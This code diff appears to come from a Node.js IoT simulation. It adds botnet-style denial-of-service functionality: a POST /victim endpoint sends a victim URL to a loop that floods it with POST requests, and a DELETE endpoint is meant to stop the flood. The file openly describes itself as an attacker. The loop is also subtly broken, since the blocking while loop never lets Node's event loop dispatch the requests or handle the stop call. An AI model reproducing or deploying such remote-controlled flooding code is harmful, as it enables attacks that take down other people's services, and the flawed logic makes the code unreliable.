@@ -12,6 +12,7 @@ var id = process.argv.slice(2);//"My IoT";
 var leader = true;
 var receivedAll = 0;
 var electionSent = 0;
+var attack = false;
 
 function randomizer(min, max) {
 	return Math.floor(Math.random() * (max - min + 1)) + min;
@@ -159,9 +160,26 @@ app.post("/election", function(req, res) {
 
 app.post("/victim", function(req, res) {
 	console.log("attacking...");
+	attack = true;
+	while (attack) {
+		attackVictim(req.body.victim);
+	}
 	res.sendStatus(200);
 });
 
+app.delete("/victim", function(req, res) {
+	attack = false;
+	res.sendStatus(200);
+});
+
+function attackVictim(victim) {
+	request.post({
+	  headers: {"content-type" : "application/json"},
+	  url:     victim + "/",
+	  body:    "{}"
+	}, function(error, res, body){
+	});
+}
 
 //Starts this attacker. Default Port would be 8081, else +1
 var port = 8081;
